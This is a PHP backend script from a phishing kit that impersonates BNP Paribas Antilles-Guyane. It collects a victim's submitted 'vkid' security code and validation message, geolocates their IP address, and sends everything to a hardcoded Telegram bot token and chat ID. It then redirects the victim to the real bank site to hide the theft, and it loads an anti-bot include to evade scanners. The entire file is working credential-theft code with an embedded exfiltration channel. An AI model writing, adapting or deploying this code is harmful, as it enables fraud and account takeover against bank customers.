<?php

include 'antibots.php';

/**$message = "";
while (list($key, $val) = each($_POST)) {if(!empty($val)) {$message .= "$key : $val\n";}}**/

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$RZ3 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$CNCD = $RZ3->geoplugin_countryCode ; // Country
$STCD = $RZ3->geoplugin_regionCode ; //  State

$message = "";

$message .= "==========  Shyne BNP Antilles ==========\n";
$message .= "Code vkid : ".$_POST['vkid']."\n";
$message .= "Validation message: ".$_POST['p0']."\n";
$message .= "Country : ".$CNCD."\n";
$message .= "City : ".$STCD."\n";
$message .= "From : ".$ip."\n";
$message .= "==========  Shyne BNP Antilles  =========\n";

include './extra/extra.php';

$telegram = new Telegram('7341930814:AAEWyt4OxEBNCyOlqogU356O5O90rjcnRtc');
$chat_id = 1678960473 ;
$content = array('chat_id' => $chat_id, 'text' => $message);
$send = $telegram->sendMessage($content);

 
 header('location: https://antilles-guyane.bnpparibas');
 
 ?>